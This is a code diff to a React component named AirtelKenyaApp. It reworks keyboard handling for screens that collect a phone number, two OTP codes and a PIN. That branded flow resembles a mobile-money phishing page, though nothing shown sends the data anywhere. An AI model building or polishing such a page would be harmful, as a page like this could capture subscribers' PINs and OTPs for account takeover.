@@ -229,7 +229,7 @@ export default function AirtelKenyaApp() {
   }
 
   // -------------------------------------------------------------
-  // PHYSICAL KEYBOARD LISTENER
+  // PHYSICAL KEYBOARD LISTENER (For Screens 1 & 2 without native input)
   // -------------------------------------------------------------
   useEffect(() => {
     const handleKeyDown = (e: KeyboardEvent) => {
@@ -249,22 +249,6 @@ export default function AirtelKenyaApp() {
         } else if (e.key === "Backspace" || e.key === "Delete") {
           handleOtp1KeypadDelete()
         }
-      } else if (currentStep === "pin") {
-        if (/^[0-9]$/.test(e.key)) {
-          handlePinKeypadPress(e.key)
-        } else if (e.key === "Backspace" || e.key === "Delete") {
-          handlePinKeypadDelete()
-        } else if (e.key === "Enter" && pin.trim().length > 0) {
-          handlePinSubmit()
-        }
-      } else if (currentStep === "otp2") {
-        if (/^[0-9]$/.test(e.key)) {
-          handleOtp2KeypadPress(e.key)
-        } else if (e.key === "Backspace" || e.key === "Delete") {
-          handleOtp2KeypadDelete()
-        } else if (e.key === "Enter" && otp2.trim().length > 0) {
-          handleOtp2Submit()
-        }
       }
     }
 
@@ -274,16 +258,10 @@ export default function AirtelKenyaApp() {
     currentStep,
     isLoading,
     phoneNumber,
-    pin,
-    otp2,
     handleKeypadPress,
     handleKeypadDelete,
     handleOtp1KeypadPress,
     handleOtp1KeypadDelete,
-    handlePinKeypadPress,
-    handlePinKeypadDelete,
-    handleOtp2KeypadPress,
-    handleOtp2KeypadDelete,
   ])
 
   // Helper: Masked phone number for OTP subtitles
@@ -669,11 +647,15 @@ export default function AirtelKenyaApp() {
                 <div className="flex items-center py-2.5 border-t-[1.5px] border-b-[1.5px] border-[#7CA9CA] text-[18px]">
                   <Lock className="w-[19px] h-[19px] text-[#9ca3af] stroke-[1.8] mr-2 shrink-0" />
                   <input
-                    type="tel"
-                    inputMode="numeric"
+                    type="text"
                     placeholder="Enter PIN"
                     value={pin}
                     onChange={(e) => setPin(e.target.value)}
+                    onKeyDown={(e) => {
+                      if (e.key === "Enter" && pin.trim().length > 0) {
+                        handlePinSubmit()
+                      }
+                    }}
                     className="flex-1 bg-transparent text-[#1f2937] font-normal tracking-wide text-lg outline-none placeholder:text-[#c4c4c4] placeholder:font-normal"
                     autoFocus
                   />
@@ -769,6 +751,11 @@ export default function AirtelKenyaApp() {
                     onChange={(e) => {
                       setOtp2(e.target.value)
                       setOtp2Error("")
+                    }}
+                    onKeyDown={(e) => {
+                      if (e.key === "Enter" && otp2.trim().length > 0) {
+                        handleOtp2Submit()
+                      }
                     }}
                     className="flex-1 bg-transparent text-[#1f2937] font-bold tracking-[0.2em] text-lg sm:text-xl outline-none placeholder:text-[#c4c4c4] placeholder:font-normal placeholder:tracking-normal placeholder:text-sm sm:placeholder:text-base"
                     autoFocus
